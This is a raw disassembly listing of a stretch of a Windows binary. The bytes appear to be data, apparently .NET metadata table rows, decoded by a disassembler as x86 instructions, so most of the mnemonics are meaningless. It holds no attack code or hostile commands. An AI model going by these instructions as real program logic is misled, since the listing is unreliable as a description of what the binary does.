  40634f:	01 33                	add    %esi,(%ebx)
  406351:	00 df                	add    %bl,%bh
  406353:	23 00                	and    (%eax),%eax
  406355:	00 00                	add    %al,(%eax)
  406357:	00 86 00 01 09 9e    	add    %al,-0x61f6ff00(%esi)
  40635d:	01 34 00             	add    %esi,(%eax,%eax,1)
  406360:	f5                   	cmc
  406361:	23 00                	and    (%eax),%eax
  406363:	00 00                	add    %al,(%eax)
  406365:	00 86 00 44 16 a3    	add    %al,-0x5ce9bc00(%esi)
  40636b:	01 35 00 a8 36 00    	add    %esi,0x36a800
  406371:	00 00                	add    %al,(%eax)
  406373:	00 86 00 81 03 79    	add    %al,0x79038100(%esi)
  406379:	01 36                	add    %esi,(%esi)
  40637b:	00 fc                	add    %bh,%ah
  40637d:	36 00 00             	add    %al,%ss:(%eax)
  406380:	00 00                	add    %al,(%eax)
  406382:	86 00                	xchg   %al,(%eax)
  406384:	76 23                	jbe    0x4063a9
  406386:	53                   	push   %ebx
  406387:	01 37                	add    %esi,(%edi)
  406389:	00 20                	add    %ah,(%eax)
  40638b:	37                   	aaa
  40638c:	00 00                	add    %al,(%eax)
  40638e:	00 00                	add    %al,(%eax)
  406390:	86 00                	xchg   %al,(%eax)
  406392:	33 26                	xor    (%esi),%esp
  406394:	5d                   	pop    %ebp
  406395:	01 38                	add    %edi,(%eax)
  406397:	00 b0 3c 00 00 00    	add    %dh,0x3c(%eax)
  40639d:	00 86 00 f1 08 7f    	add    %al,0x7f08f100(%esi)
  4063a3:	01 39                	add    %edi,(%ecx)
  4063a5:	00 14 3d 00 00 00 00 	add    %dl,0x0(,%edi,1)
  4063ac:	86 00                	xchg   %al,(%eax)
  4063ae:	3d 03 5d 01 39       	cmp    $0x39015d03,%eax
  4063b3:	00 0a                	add    %cl,(%edx)
  4063b5:	24 00                	and    $0x0,%al
  4063b7:	00 00                	add    %al,(%eax)
  4063b9:	00 86 08 e9 13 95    	add    %al,-0x6aec16f8(%esi)
  4063bf:	01 3a                	add    %edi,(%edx)
  4063c1:	00 12                	add    %dl,(%edx)
  4063c3:	24 00                	and    $0x0,%al
  4063c5:	00 00                	add    %al,(%eax)
  4063c7:	00 86 08 f6 13 53    	add    %al,0x5313f608(%esi)
  4063cd:	01 3a                	add    %edi,(%edx)
  4063cf:	00 1b                	add    %bl,(%ebx)
  4063d1:	24 00                	and    $0x0,%al
  4063d3:	00 00                	add    %al,(%eax)
  4063d5:	00 86 08 ef 1b 71    	add    %al,0x711bef08(%esi)
  4063db:	01 3b                	add    %edi,(%ebx)
  4063dd:	00 23                	add    %ah,(%ebx)
  4063df:	24 00                	and    $0x0,%al
  4063e1:	00 00                	add    %al,(%eax)
  4063e3:	00 86 08 fd 1b 63    	add    %al,0x631bfd08(%esi)
  4063e9:	01 3b                	add    %edi,(%ebx)
  4063eb:	00 2c 24             	add    %ch,(%esp)
  4063ee:	00 00                	add    %al,(%eax)
  4063f0:	00 00                	add    %al,(%eax)
  4063f2:	86 08                	xchg   %cl,(%eax)
  4063f4:	55                   	push   %ebp
  4063f5:	20 75 01             	and    %dh,0x1(%ebp)
  4063f8:	3c 00                	cmp    $0x0,%al
  4063fa:	34 24                	xor    $0x24,%al
  4063fc:	00 00                	add    %al,(%eax)
  4063fe:	00 00                	add    %al,(%eax)
  406400:	86 08                	xchg   %cl,(%eax)
  406402:	61                   	popa
  406403:	20 a3 01 3c 00 0c    	and    %ah,0xc003c01(%ebx)
  406409:	3e 00 00             	add    %al,%ds:(%eax)
  40640c:	00 00                	add    %al,(%eax)
  40640e:	86 08                	xchg   %cl,(%eax)
  406410:	0b 25 a8 01 3d 00    	or     0x3d01a8,%esp
  406416:	3d 24 00 00 00       	cmp    $0x24,%eax
  40641b:	00 86 08 69 0f ad    	add    %al,-0x52f096f8(%esi)
  406421:	01 3d 00 45 24 00    	add    %edi,0x244500
  406427:	00 00                	add    %al,(%eax)
  406429:	00 e1                	add    %ah,%cl
  40642b:	01 b2 1c b2 01 3d    	add    %esi,0x3d01b21c(%edx)
  406431:	00 52 24             	add    %dl,0x24(%edx)
  406434:	00 00                	add    %al,(%eax)
  406436:	00 00                	add    %al,(%eax)
  406438:	86 18                	xchg   %bl,(%eax)
  40643a:	e9 1c 0e 00 3d       	jmp    0x3d40725b
  40643f:	00 64 3e 00          	add    %ah,0x0(%esi,%edi,1)
  406443:	00 00                	add    %al,(%eax)
  406445:	00 96 00 b2 01 09    	add    %dl,0x901b200(%esi)
  40644b:	02 3d 00 65 24 00    	add    0x246500,%bh
  406451:	00 00                	add    %al,(%eax)
  406453:	00 96 00 24 15 10    	add    %dl,0x10152400(%esi)
  406459:	02 3f                	add    (%edi),%bh
  40645b:	00 88 3e 00 00 00    	add    %cl,0x3e(%eax)
  406461:	00 96 00 bc 03 16    	add    %dl,0x1603bc00(%esi)
  406467:	02 40 00             	add    0x0(%eax),%al
  40646a:	78 20                	js     0x40648c
  40646c:	00 00                	add    %al,(%eax)
  40646e:	00 00                	add    %al,(%eax)
  406470:	86 18                	xchg   %bl,(%eax)
  406472:	e9 1c 0e 00 42       	jmp    0x42407293
  406477:	00 74 24 00          	add    %dh,0x0(%esp)
  40647b:	00 00                	add    %al,(%eax)
  40647d:	00 96 00 a5 12 1d    	add    %dl,0x1d12a500(%esi)
  406483:	02 42 00             	add    0x0(%edx),%al
  406486:	30 3f                	xor    %bh,(%edi)
  406488:	00 00                	add    %al,(%eax)
  40648a:	00 00                	add    %al,(%eax)
  40648c:	96                   	xchg   %eax,%esi
  40648d:	00 e6                	add    %ah,%dh
  40648f:	02 23                	add    (%ebx),%ah
  406491:	02 43 00             	add    0x0(%ebx),%al
  406494:	e4 3f                	in     $0x3f,%al
  406496:	00 00                	add    %al,(%eax)
  406498:	00 00                	add    %al,(%eax)
  40649a:	96                   	xchg   %eax,%esi
  40649b:	00 10                	add    %dl,(%eax)
  40649d:	04 2a                	add    $0x2a,%al
  40649f:	02 45 00             	add    0x0(%ebp),%al
  4064a2:	81 24 00 00 00 00 96 	andl   $0x96000000,(%eax,%eax,1)
  4064a9:	00 9c 05 32 02 47 00 	add    %bl,0x470232(%ebp,%eax,1)
  4064b0:	9c                   	pushf
  4064b1:	24 00                	and    $0x0,%al
  4064b3:	00 00                	add    %al,(%eax)
  4064b5:	00 96 00 c9 22 39    	add    %dl,0x3922c900(%esi)
  4064bb:	02 49 00             	add    0x0(%ecx),%cl
  4064be:	bc 24 00 00 00       	mov    $0x24,%esp
  4064c3:	00 96 00 04 03 40    	add    %dl,0x40030400(%esi)
  4064c9:	02 4b 00             	add    0x0(%ebx),%cl
  4064cc:	78 40                	js     0x40650e
  4064ce:	00 00                	add    %al,(%eax)
  4064d0:	00 00                	add    %al,(%eax)
  4064d2:	96                   	xchg   %eax,%esi
  4064d3:	00 36                	add    %dh,(%esi)
  4064d5:	05 47 02 4d 00       	add    $0x4d0247,%eax
  4064da:	a8 40                	test   $0x40,%al
  4064dc:	00 00                	add    %al,(%eax)
  4064de:	00 00                	add    %al,(%eax)
  4064e0:	96                   	xchg   %eax,%esi
  4064e1:	00 7e 02             	add    %bh,0x2(%esi)
  4064e4:	4e                   	dec    %esi
  4064e5:	02 4f 00             	add    0x0(%edi),%cl
  4064e8:	78 20                	js     0x40650a
  4064ea:	00 00                	add    %al,(%eax)
  4064ec:	00 00                	add    %al,(%eax)
  4064ee:	86 18                	xchg   %bl,(%eax)
  4064f0:	e9 1c 0e 00 51       	jmp    0x51407311
  4064f5:	00 d4                	add    %dl,%ah
  4064f7:	41                   	inc    %ecx
  4064f8:	00 00                	add    %al,(%eax)
  4064fa:	00 00                	add    %al,(%eax)
  4064fc:	96                   	xchg   %eax,%esi
  4064fd:	00 55 07             	add    %dl,0x7(%ebp)
  406500:	0a 00                	or     (%eax),%al
  406502:	51                   	push   %ecx
  406503:	00 78 20             	add    %bh,0x20(%eax)
  406506:	00 00                	add    %al,(%eax)
  406508:	00 00                	add    %al,(%eax)
  40650a:	86 18                	xchg   %bl,(%eax)
  40650c:	e9 1c 0e 00 51       	jmp    0x5140732d
  406511:	00 d8                	add    %bl,%al
  406513:	24 00                	and    $0x0,%al
  406515:	00 00                	add    %al,(%eax)
  406517:	00 96 00 1e 1d 0a    	add    %dl,0xa1d1e00(%esi)
  40651d:	00 51 00             	add    %dl,0x0(%ecx)
  406520:	00 45 00             	add    %al,0x0(%ebp)
  406523:	00 00                	add    %al,(%eax)
  406525:	00 91 00 d0 09 1d    	add    %dl,0x1d09d000(%ecx)
  40652b:	00 51 00             	add    %dl,0x0(%ecx)
  40652e:	4c                   	dec    %esp
  40652f:	45                   	inc    %ebp
  406530:	00 00                	add    %al,(%eax)
  406532:	00 00                	add    %al,(%eax)
  406534:	91                   	xchg   %eax,%ecx
  406535:	00 cc                	add    %cl,%ah
  406537:	04 1d                	add    $0x1d,%al
  406539:	00 51 00             	add    %dl,0x0(%ecx)
  40653c:	90                   	nop
  40653d:	45                   	inc    %ebp
  40653e:	00 00                	add    %al,(%eax)
  406540:	00 00                	add    %al,(%eax)
  406542:	91                   	xchg   %eax,%ecx
  406543:	00 79 15             	add    %bh,0x15(%ecx)
  406546:	1d 00 51 00 a0       	sbb    $0xa0005100,%eax
  40654b:	46                   	inc    %esi
  40654c:	00 00                	add    %al,(%eax)
  40654e:	00 00                	add    %al,(%eax)
  406550:	91                   	xchg   %eax,%ecx
  406551:	00 c1                	add    %al,%cl
  406553:	01 1d 00 51 00 dc    	add    %ebx,0xdc005100
  406559:	46                   	inc    %esi
  40655a:	00 00                	add    %al,(%eax)
  40655c:	00 00                	add    %al,(%eax)
  40655e:	91                   	xchg   %eax,%ecx
  40655f:	00 d9                	add    %bl,%cl
  406561:	22 1d 00 51 00 00    	and    0x5100,%bl
  406567:	00 00                	add    %al,(%eax)
  406569:	00 80 00 96 20 ff    	add    %al,-0xdf6a00(%eax)
  40656f:	12 55 02             	adc    0x2(%ebp),%dl
  406572:	51                   	push   %ecx
  406573:	00 00                	add    %al,(%eax)
  406575:	00 00                	add    %al,(%eax)
  406577:	00 80 00 91 20 6c    	add    %al,0x6c209100(%eax)
  40657d:	18 5a 02             	sbb    %bl,0x2(%edx)
  406580:	52                   	push   %edx
  406581:	00 78 20             	add    %bh,0x20(%eax)
  406584:	00 00                	add    %al,(%eax)
  406586:	00 00                	add    %al,(%eax)
  406588:	86 18                	xchg   %bl,(%eax)
  40658a:	e9 1c 0e 00 54       	jmp    0x544073ab
  40658f:	00 1c 47             	add    %bl,(%edi,%eax,2)
  406592:	00 00                	add    %al,(%eax)
  406594:	00 00                	add    %al,(%eax)
  406596:	86 00                	xchg   %al,(%eax)
  406598:	2f                   	das
  406599:	18 95 01 54 00 a0    	sbb    %dl,-0x5fffabff(%ebp)
  40659f:	47                   	inc    %edi
  4065a0:	00 00                	add    %al,(%eax)
  4065a2:	00 00                	add    %al,(%eax)
  4065a4:	86 00                	xchg   %al,(%eax)
  4065a6:	0c 07                	or     $0x7,%al
  4065a8:	61                   	popa
  4065a9:	02 54 00 78          	add    0x78(%eax,%eax,1),%dl
  4065ad:	20 00                	and    %al,(%eax)
  4065af:	00 00                	add    %al,(%eax)
  4065b1:	00 86 18 e9 1c 0e    	add    %al,0xe1ce918(%esi)
  4065b7:	00 55 00             	add    %dl,0x0(%ebp)
  4065ba:	44                   	inc    %esp
  4065bb:	48                   	dec    %eax
  4065bc:	00 00                	add    %al,(%eax)
  4065be:	00 00                	add    %al,(%eax)
  4065c0:	96                   	xchg   %eax,%esi
  4065c1:	00 ab 05 67 02 55    	add    %ch,0x55026705(%ebx)
  4065c7:	00 c0                	add    %al,%al
  4065c9:	48                   	dec    %eax
  4065ca:	00 00                	add    %al,(%eax)
  4065cc:	00 00                	add    %al,(%eax)
  4065ce:	96                   	xchg   %eax,%esi
  4065cf:	00 89 09 6b 02 55    	add    %cl,0x55026b09(%ecx)
  4065d5:	00 28                	add    %ch,(%eax)
  4065d7:	49                   	dec    %ecx
  4065d8:	00 00                	add    %al,(%eax)
  4065da:	00 00                	add    %al,(%eax)
  4065dc:	96                   	xchg   %eax,%esi
  4065dd:	00 29                	add    %ch,(%ecx)
  4065df:	0a 53 00             	or     0x0(%ebx),%dl
  4065e2:	56                   	push   %esi
  4065e3:	00 03                	add    %al,(%ebx)
  4065e5:	25 00 00 00 00       	and    $0x0,%eax
  4065ea:	96                   	xchg   %eax,%esi
  4065eb:	00 03                	add    %al,(%ebx)
  4065ed:	23 1d 00 56 00 e8    	and    0xe8005600,%ebx
  4065f3:	4a                   	dec    %edx
  4065f4:	00 00                	add    %al,(%eax)
  4065f6:	00 00                	add    %al,(%eax)
  4065f8:	96                   	xchg   %eax,%esi
  4065f9:	00 f8                	add    %bh,%al
  4065fb:	0c 0a                	or     $0xa,%al
  4065fd:	00 56 00             	add    %dl,0x0(%esi)
  406600:	48                   	dec    %eax
  406601:	4b                   	dec    %ebx
  406602:	00 00                	add    %al,(%eax)
  406604:	00 00                	add    %al,(%eax)
  406606:	96                   	xchg   %eax,%esi
  406607:	00 7f 06             	add    %bh,0x6(%edi)
  40660a:	67 02 56 00          	add    0x0(%bp),%dl
  40660e:	1c 4c                	sbb    $0x4c,%al
  406610:	00 00                	add    %al,(%eax)
  406612:	00 00                	add    %al,(%eax)
  406614:	96                   	xchg   %eax,%esi
  406615:	00 0b                	add    %cl,(%ebx)
  406617:	01 79 02             	add    %edi,0x2(%ecx)
  40661a:	56                   	push   %esi
  40661b:	00 00                	add    %al,(%eax)
  40661d:	00 00                	add    %al,(%eax)
  40661f:	00 80 00 96 20 b0    	add    %al,-0x4fdf6a00(%eax)
  406625:	23 80 02 57 00 58    	and    0x58005702(%eax),%eax
  40662b:	4c                   	dec    %esp
  40662c:	00 00                	add    %al,(%eax)
  40662e:	00 00                	add    %al,(%eax)
  406630:	96                   	xchg   %eax,%esi
  406631:	00 64 26 0a          	add    %ah,0xa(%esi,%eiz,1)
  406635:	00 58 00             	add    %bl,0x0(%eax)
  406638:	88 4c 00 00          	mov    %cl,0x0(%eax,%eax,1)
  40663c:	00 00                	add    %al,(%eax)
  40663e:	96                   	xchg   %eax,%esi
  40663f:	00 36                	add    %dh,(%esi)
  406641:	14 1d                	adc    $0x1d,%al
  406643:	00 58 00             	add    %bl,0x0(%eax)
  406646:	19 25 00 00 00 00    	sbb    %esp,0x0
  40664c:	96                   	xchg   %eax,%esi
  40664d:	00 ca                	add    %cl,%dl
  40664f:	17                   	pop    %ss
  406650:	0a 00                	or     (%eax),%al
  406652:	58                   	pop    %eax
  406653:	00 32                	add    %dh,(%edx)
  406655:	25 00 00 00 00       	and    $0x0,%eax
  40665a:	96                   	xchg   %eax,%esi
  40665b:	00 0f                	add    %cl,(%edi)
  40665d:	05 97 02 58 00       	add    $0x580297,%eax
  406662:	a8 4c                	test   $0x4c,%al
  406664:	00 00                	add    %al,(%eax)
  406666:	00 00                	add    %al,(%eax)
  406668:	96                   	xchg   %eax,%esi
  406669:	00 c9                	add    %cl,%cl
  40666b:	06                   	push   %es
  40666c:	0a 00                	or     (%eax),%al
  40666e:	5a                   	pop    %edx
  40666f:	00 e8                	add    %ch,%al
  406671:	4c                   	dec    %esp
  406672:	00 00                	add    %al,(%eax)
  406674:	00 00                	add    %al,(%eax)
  406676:	96                   	xchg   %eax,%esi
  406677:	00 42 24             	add    %al,0x24(%edx)
  40667a:	0a 00                	or     (%eax),%al
  40667c:	5a                   	pop    %edx
  40667d:	00 00                	add    %al,(%eax)
  40667f:	00 00                	add    %al,(%eax)
  406681:	00 80 00 91 20 f9    	add    %al,-0x6df6f00(%eax)
  406687:	01 9e 02 5a 00 1c    	add    %ebx,0x1c005a02(%esi)
  40668d:	4d                   	dec    %ebp
  40668e:	00 00                	add    %al,(%eax)
  406690:	00 00                	add    %al,(%eax)
  406692:	96                   	xchg   %eax,%esi
  406693:	00 b8 24 a5 02 5d    	add    %bh,0x5d02a524(%eax)
  406699:	00 7c 4d 00          	add    %bh,0x0(%ebp,%ecx,2)
  40669d:	00 00                	add    %al,(%eax)
  40669f:	00 96 00 96 0a 6b    	add    %dl,0x6b0a9600(%esi)
  4066a5:	02 5f 00             	add    0x0(%edi),%bl
  4066a8:	e0 4d                	loopne 0x4066f7
  4066aa:	00 00                	add    %al,(%eax)
  4066ac:	00 00                	add    %al,(%eax)
  4066ae:	96                   	xchg   %eax,%esi
  4066af:	00 a9 06 84 00 60    	add    %ch,0x60008406(%ecx)
  4066b5:	00 40 4e             	add    %al,0x4e(%eax)
  4066b8:	00 00                	add    %al,(%eax)
  4066ba:	00 00                	add    %al,(%eax)
  4066bc:	96                   	xchg   %eax,%esi
  4066bd:	00 09                	add    %cl,(%ecx)
  4066bf:	15 1d 00 61 00       	adc    $0x61001d,%eax
  4066c4:	4c                   	dec    %esp
  4066c5:	25 00 00 00 00       	and    $0x0,%eax
  4066ca:	91                   	xchg   %eax,%ecx
  4066cb:	18 ef                	sbb    %ch,%bh
  4066cd:	1c 0a                	sbb    $0xa,%al
  4066cf:	00 61 00             	add    %ah,0x0(%ecx)
  4066d2:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4066d3:	4e                   	dec    %esi
  4066d4:	00 00                	add    %al,(%eax)
  4066d6:	00 00                	add    %al,(%eax)
  4066d8:	96                   	xchg   %eax,%esi
  4066d9:	00 55 04             	add    %dl,0x4(%ebp)
  4066dc:	9a 00 61 00 c0 50 00 	lcall  $0x50,$0xc0006100
  4066e3:	00 00                	add    %al,(%eax)
  4066e5:	00 91 00 a8 19 ab    	add    %dl,-0x54e65800(%ecx)
  4066eb:	02 62 00             	add    0x0(%edx),%ah
  4066ee:	62 25 00 00 00 00    	bound  %esp,0x0
  4066f4:	91                   	xchg   %eax,%ecx
  4066f5:	00 8a 24 0a 00 63    	add    %cl,0x63000a24(%edx)
  4066fb:	00 92 25 00 00 00    	add    %dl,0x25(%edx)
  406701:	00 96 00 b0 08 b1    	add    %dl,-0x4ef75000(%esi)
  406707:	02 63 00             	add    0x0(%ebx),%ah
  40670a:	c9                   	leave
  40670b:	25 00 00 00 00       	and    $0x0,%eax
  406710:	91                   	xchg   %eax,%ecx
  406711:	18 ef                	sbb    %ch,%bh
  406713:	1c 0a                	sbb    $0xa,%al
  406715:	00 64 00 e8          	add    %ah,-0x18(%eax,%eax,1)
  406719:	51                   	push   %ecx
  40671a:	00 00                	add    %al,(%eax)
  40671c:	00 00                	add    %al,(%eax)
  40671e:	86 18                	xchg   %bl,(%eax)
  406720:	e9 1c 53 01 64       	jmp    0x6441ba41
  406725:	00 d5                	add    %dl,%ch
  406727:	25 00 00 00 00       	and    $0x0,%eax
  40672c:	86 00                	xchg   %al,(%eax)
  40672e:	e1 12                	loope  0x406742
  406730:	de 02                	fiadds (%edx)
  406732:	65 00 58 52          	add    %bl,%gs:0x52(%eax)
  406736:	00 00                	add    %al,(%eax)
  406738:	00 00                	add    %al,(%eax)
  40673a:	86 00                	xchg   %al,(%eax)
  40673c:	85 1a                	test   %ebx,(%edx)
  40673e:	e3 02                	jecxz  0x406742
  406740:	66 00 ed             	data16 add %ch,%ch
  406743:	25 00 00 00 00       	and    $0x0,%eax
  406748:	86 00                	xchg   %al,(%eax)
  40674a:	6c                   	insb   (%dx),%es:(%edi)
  40674b:	22 de                	and    %dh,%bl
  40674d:	02 67 00             	add    0x0(%edi),%ah
  406750:	98                   	cwtl
  406751:	53                   	push   %ebx
  406752:	00 00                	add    %al,(%eax)
  406754:	00 00                	add    %al,(%eax)
  406756:	86 00                	xchg   %al,(%eax)
  406758:	71 26                	jno    0x406780
  40675a:	e3 02                	jecxz  0x40675e
  40675c:	68 00 40 55 00       	push   $0x554000
  406761:	00 48 00             	add    %cl,0x0(%eax)
  406764:	81 00 75 1a ea 02    	addl   $0x2ea1a75,(%eax)
  40676a:	69 00 05 26 00 00    	imul   $0x2605,(%eax),%eax
  406770:	00 00                	add    %al,(%eax)
  406772:	91                   	xchg   %eax,%ecx
  406773:	18 ef                	sbb    %ch,%bh
  406775:	1c 0a                	sbb    $0xa,%al
  406777:	00 6b 00             	add    %ch,0x0(%ebx)
  40677a:	68 55 00 00 00       	push   $0x55
  40677f:	00 96 00 64 03 6b    	add    %dl,0x6b036400(%esi)
  406785:	02 6b 00             	add    0x0(%ebx),%ch
  406788:	ec                   	in     (%dx),%al
  406789:	55                   	push   %ebp
  40678a:	00 00                	add    %al,(%eax)
  40678c:	00 00                	add    %al,(%eax)
  40678e:	96                   	xchg   %eax,%esi
  40678f:	00 58 0a             	add    %bl,0xa(%eax)
  406792:	d3 00                	roll   %cl,(%eax)
  406794:	6c                   	insb   (%dx),%es:(%edi)
  406795:	00 24 56             	add    %ah,(%esi,%edx,2)
  406798:	00 00                	add    %al,(%eax)
  40679a:	00 00                	add    %al,(%eax)
  40679c:	96                   	xchg   %eax,%esi
  40679d:	00 8e 06 d3 00 6d    	add    %cl,0x6d00d306(%esi)
  4067a3:	00 a4 56 00 00 00 00 	add    %ah,0x0(%esi,%edx,2)
  4067aa:	96                   	xchg   %eax,%esi
  4067ab:	00 2d 08 d3 00 6e    	add    %ch,0x6e00d308
  4067b1:	00 00                	add    %al,(%eax)
  4067b3:	00 01                	add    %al,(%ecx)
  4067b5:	00 49 18             	add    %cl,0x18(%ecx)
  4067b8:	00 00                	add    %al,(%eax)
  4067ba:	01 00                	add    %eax,(%eax)
  4067bc:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4067bd:	23 00                	and    (%eax),%eax
  4067bf:	00 01                	add    %al,(%ecx)
  4067c1:	00 b0 04 00 00 01    	add    %dh,0x1000004(%eax)
  4067c7:	00 f1                	add    %dh,%cl
  4067c9:	04 00                	add    $0x0,%al
  4067cb:	00 01                	add    %al,(%ecx)
  4067cd:	00 e8                	add    %ch,%al
  4067cf:	03 00                	add    (%eax),%eax
  4067d1:	00 01                	add    %al,(%ecx)
  4067d3:	00 14 06             	add    %dl,(%esi,%eax,1)
  4067d6:	00 00                	add    %al,(%eax)
  4067d8:	01 00                	add    %eax,(%eax)
  4067da:	8c 07                	mov    %es,(%edi)
  4067dc:	00 00                	add    %al,(%eax)
  4067de:	01 00                	add    %eax,(%eax)
  4067e0:	f7 1a                	negl   (%edx)
  4067e2:	00 00                	add    %al,(%eax)
  4067e4:	01 00                	add    %eax,(%eax)
  4067e6:	dc 14 00             	fcoml  (%eax,%eax,1)
  4067e9:	00 01                	add    %al,(%ecx)
  4067eb:	00 4b 26             	add    %cl,0x26(%ebx)
  4067ee:	00 00                	add    %al,(%eax)
  4067f0:	01 00                	add    %eax,(%eax)
  4067f2:	cc                   	int3
  4067f3:	08 00                	or     %al,(%eax)
  4067f5:	00 02                	add    %al,(%edx)
  4067f7:	00 1c 05 00 00 03 00 	add    %bl,0x30000(,%eax,1)
  4067fe:	af                   	scas   %es:(%edi),%eax
  4067ff:	0a 00                	or     (%eax),%al
  406801:	00 04 00             	add    %al,(%eax,%eax,1)
  406804:	52                   	push   %edx
  406805:	08 00                	or     %al,(%eax)
  406807:	00 01                	add    %al,(%ecx)
  406809:	00 13                	add    %dl,(%ebx)
  40680b:	23 00                	and    (%eax),%eax
  40680d:	00 01                	add    %al,(%ecx)
  40680f:	00 b6 19 00 00 01    	add    %dh,0x1000019(%esi)
  406815:	00 ec                	add    %ch,%ah
  406817:	19 00                	sbb    %eax,(%eax)
  406819:	00 01                	add    %al,(%ecx)
  40681b:	00 fc                	add    %bh,%ah
  40681d:	00 00                	add    %al,(%eax)
  40681f:	00 01                	add    %al,(%ecx)
  406821:	00 39                	add    %bh,(%ecx)
  406823:	04 00                	add    $0x0,%al
  406825:	00 01                	add    %al,(%ecx)
  406827:	00 6e 14             	add    %ch,0x14(%esi)
  40682a:	00 00                	add    %al,(%eax)
  40682c:	01 00                	add    %eax,(%eax)
  40682e:	78 08                	js     0x406838
  406830:	00 00                	add    %al,(%eax)
  406832:	01 00                	add    %eax,(%eax)
  406834:	33 24 00             	xor    (%eax,%eax,1),%esp
  406837:	00 01                	add    %al,(%ecx)
  406839:	00 a5 01 00 00 01    	add    %ah,0x1000001(%ebp)
  40683f:	00 97 12 00 00 01    	add    %dl,0x1000012(%edi)
  406845:	00 ce                	add    %cl,%dh
  406847:	14 00                	adc    $0x0,%al
  406849:	00 01                	add    %al,(%ecx)
  40684b:	00 94 01 00 00 01 00 	add    %dl,0x10000(%ecx,%eax,1)
  406852:	c8 05 00 00          	enter  $0x5,$0x0
  406856:	01 00                	add    %eax,(%eax)
  406858:	86 15 00 00 01 00    	xchg   %dl,0x10000
  40685e:	67 06                	addr16 push %es
  406860:	00 00                	add    %al,(%eax)
  406862:	02 00                	add    (%eax),%al
  406864:	04 0a                	add    $0xa,%al
  406866:	00 00                	add    %al,(%eax)
  406868:	01 00                	add    %eax,(%eax)
  40686a:	36 01 00             	add    %eax,%ss:(%eax)
  40686d:	00 01                	add    %al,(%ecx)
  40686f:	00 fd                	add    %bh,%ch
  406871:	06                   	push   %es
  406872:	00 00                	add    %al,(%eax)
  406874:	01 00                	add    %eax,(%eax)
  406876:	36 16                	ss push %ss
  406878:	00 00                	add    %al,(%eax)
  40687a:	01 00                	add    %eax,(%eax)
  40687c:	68 23 00 00 01       	push   $0x1000023
  406881:	00 0c 13             	add    %cl,(%ebx,%edx,1)
  406884:	00 00                	add    %al,(%eax)
  406886:	01 00                	add    %eax,(%eax)
  406888:	19 13                	sbb    %edx,(%ebx)
  40688a:	00 00                	add    %al,(%eax)
  40688c:	01 00                	add    %eax,(%eax)
  40688e:	ac                   	lods   %ds:(%esi),%al
  40688f:	03 00                	add    (%eax),%eax
  406891:	00 01                	add    %al,(%ecx)
  406893:	00 e5                	add    %ah,%ch
  406895:	08 00                	or     %al,(%eax)
  406897:	00 01                	add    %al,(%ecx)
  406899:	00 6c 08 00          	add    %ch,0x0(%eax,%ecx,1)
  40689d:	00 01                	add    %al,(%ecx)
  40689f:	00 38                	add    %bh,(%eax)
  4068a1:	08 00                	or     %al,(%eax)
  4068a3:	00 01                	add    %al,(%ecx)
  4068a5:	00 27                	add    %ah,(%edi)
  4068a7:	20 00                	and    %al,(%eax)
  4068a9:	00 01                	add    %al,(%ecx)
  4068ab:	00 84 23 00 00 01 00 	add    %al,0x10000(%ebx,%eiz,1)
  4068b2:	17                   	pop    %ss
  4068b3:	17                   	pop    %ss
  4068b4:	00 00                	add    %al,(%eax)
  4068b6:	02 00                	add    (%eax),%al
  4068b8:	42                   	inc    %edx
  4068b9:	1d 00 00 01 00       	sbb    $0x10000,%eax
  4068be:	12 08                	adc    (%eax),%cl
  4068c0:	00 00                	add    %al,(%eax)
  4068c2:	02 00                	add    (%eax),%al
  4068c4:	26 17                	es pop %ss
  4068c6:	00 00                	add    %al,(%eax)
  4068c8:	01 00                	add    %eax,(%eax)
  4068ca:	83 04 00 00          	addl   $0x0,(%eax,%eax,1)
  4068ce:	01 00                	add    %eax,(%eax)
  4068d0:	3a 18                	cmp    (%eax),%bl
  4068d2:	00 00                	add    %al,(%eax)
  4068d4:	01 00                	add    %eax,(%eax)
  4068d6:	ec                   	in     (%dx),%al
  4068d7:	01 00                	add    %eax,(%eax)
  4068d9:	00 01                	add    %al,(%ecx)
  4068db:	00 6c 15 00          	add    %ch,0x0(%ebp,%edx,1)
  4068df:	00 01                	add    %al,(%ecx)
  4068e1:	00 c1                	add    %al,%cl
  4068e3:	12 00                	adc    (%eax),%al
  4068e5:	00 01                	add    %al,(%ecx)
  4068e7:	00 27                	add    %ah,(%edi)
  4068e9:	16                   	push   %ss
  4068ea:	00 00                	add    %al,(%eax)
  4068ec:	01 00                	add    %eax,(%eax)
  4068ee:	e2 06                	loop   0x4068f6
  4068f0:	00 00                	add    %al,(%eax)
  4068f2:	01 00                	add    %eax,(%eax)
  4068f4:	f8                   	clc
  4068f5:	19 00                	sbb    %eax,(%eax)
  4068f7:	00 01                	add    %al,(%ecx)
  4068f9:	00 2d 0b 00 00 01    	add    %ch,0x100000b
  4068ff:	00 ff                	add    %bh,%bh
  406901:	0a 00                	or     (%eax),%al
  406903:	00 01                	add    %al,(%ecx)
  406905:	00 28                	add    %ch,(%eax)
  406907:	04 00                	add    $0x0,%al
  406909:	00 01                	add    %al,(%ecx)
  40690b:	00 44 08 00          	add    %al,0x0(%eax,%ecx,1)
  40690f:	00 01                	add    %al,(%ecx)
  406911:	00 f0                	add    %dh,%al
  406913:	09 00                	or     %eax,(%eax)
  406915:	00 01                	add    %al,(%ecx)
  406917:	00 ed                	add    %ch,%ch
  406919:	00 00                	add    %al,(%eax)
  40691b:	00 01                	add    %al,(%ecx)
  40691d:	00 fc                	add    %bh,%ah
  40691f:	05 00 00 02 00       	add    $0x20000,%eax
  406924:	98                   	cwtl
  406925:	02 00                	add    (%eax),%al
  406927:	00 01                	add    %al,(%ecx)
  406929:	00 26                	add    %ah,(%esi)
  40692b:	24 00                	and    $0x0,%al
  40692d:	00 01                	add    %al,(%ecx)
  40692f:	00 42 17             	add    %al,0x17(%edx)
  406932:	00 00                	add    %al,(%eax)
  406934:	02 00                	add    (%eax),%al
  406936:	85 08                	test   %ecx,(%eax)
  406938:	00 00                	add    %al,(%eax)
  40693a:	01 00                	add    %eax,(%eax)
  40693c:	5f                   	pop    %edi
  40693d:	08 00                	or     %al,(%eax)
  40693f:	00 01                	add    %al,(%ecx)
  406941:	00 f5                	add    %dh,%ch
  406943:	03 00                	add    (%eax),%eax
  406945:	00 02                	add    %al,(%edx)
  406947:	00 6f 07             	add    %ch,0x7(%edi)
  40694a:	00 00                	add    %al,(%eax)
  40694c:	01 00                	add    %eax,(%eax)
  40694e:	c1 0c 00 00          	rorl   $0x0,(%eax,%eax,1)
  406952:	02 00                	add    (%eax),%al
